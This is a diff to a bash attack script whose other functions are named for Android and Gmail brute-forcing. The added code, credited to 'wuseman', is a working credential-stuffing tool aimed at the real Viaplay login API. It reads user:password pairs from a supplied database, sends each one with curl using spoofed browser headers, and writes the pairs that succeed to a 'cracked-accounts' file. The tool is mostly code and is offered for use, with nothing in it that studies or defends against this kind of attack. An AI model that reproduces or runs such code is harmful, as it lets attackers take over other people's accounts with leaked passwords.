@@ -355,6 +355,64 @@ android_cli_bruteforce_facematch() {
 
 # --- ANDROID RELATED ENDS HERE ---- ----------------------------------------------------
 
+
+banner() {
+cat << "EOF"
+                 _             _
+__      ____   _(_) __ _ _ __ | | __ _ _   _
+\ \ /\ / /\ \ / / |/ _` | '_ \| |/ _` | | | |
+ \ V  V /  \ V /| | (_| | |_) | | (_| | |_| | Author:  wuseman
+  \_/\_/    \_/ |_|\__,_| .__/|_|\__,_|\__, | Version: 1.0
+                        |_|            |___/
+---------------------------------------------------------------
+EOF
+}
+banner
+if [[ -z "${1}" ]]; then
+   echo -e "\nYou must choose at least one database ... "
+   echo -e "\n       Usage: ./$basename$0 database.txt\n"
+   exit 1
+fi
+
+if [[ ${EUID} -ne "0" ]]; then
+   echo "This tool must be executed by root"
+   exit 1
+fi
+
+if [[ ! -d "$HOME/cracked-accounts" ]]; then
+   mkdir -p "$HOME/cracked-accounts"
+fi
+
+if [[ ! -f ${1} ]]; then
+   echo -e "$basename$0: internal error -- No such database could be found, exiting..."
+   exit 1
+fi
+
+URL="https://login.viaplay.se/api/login/v1?deviceKey=pcdash-se&returnurl=https%3A%2F%2Fcontent.viaplay.se%2Fpcdash-se&username"
+
+while read line;  do
+VIAPLAY_USER=$(echo $line|cut -d: -f1|sed 's/%40/@/g')
+VIAPLAY_PASSWORD="$(echo $line|cut -d':' -f2)"
+curl -s "$URL=$VIAPLAY_USER&persistent=true" \
+       -H "$USERAGENT" \
+       -H "Accept: application/json" \
+       -H "Accept-Language: en-US,en;q=0.5" \
+       -H "Referer: https://viaplay.se/" \
+       -H "Content-Type: application/x-www-form-urlencoded; charset=utf-8" \
+       -H "Origin: https://viaplay.se" \
+       -H "Connection: keep-alive" \
+       -H "Cookie: cookie_agreement=true" \
+       -H "DNT: 1" \
+       --data "password=$VIAPLAY_PASSWORD"| grep -q "mtg-api.com"
+  if [[ "$?" = "0" ]]; then
+      echo -e "[\e[1;32m+\e[0m] - Password Cracked: $VIAPLAY_USER:$VIAPLAY_PASSWORD";
+      echo -e "$VIAPLAY_USER:$VIAPLAY_PASSWORD"  >>  $HOME/cracked-accounts/viaplay-passwords.txt
+  else
+      echo -e "[\e[1;31m-\e[0m] - Wrong Password: $VIAPLAY_USER:$VIAPLAY_PASSWORD"
+  fi
+done < $1 
+
+
 gmail_bruteforce() {
     echo "TEMP: adding a new and faster method within hours or few days - TO BE REMOVED"
 }
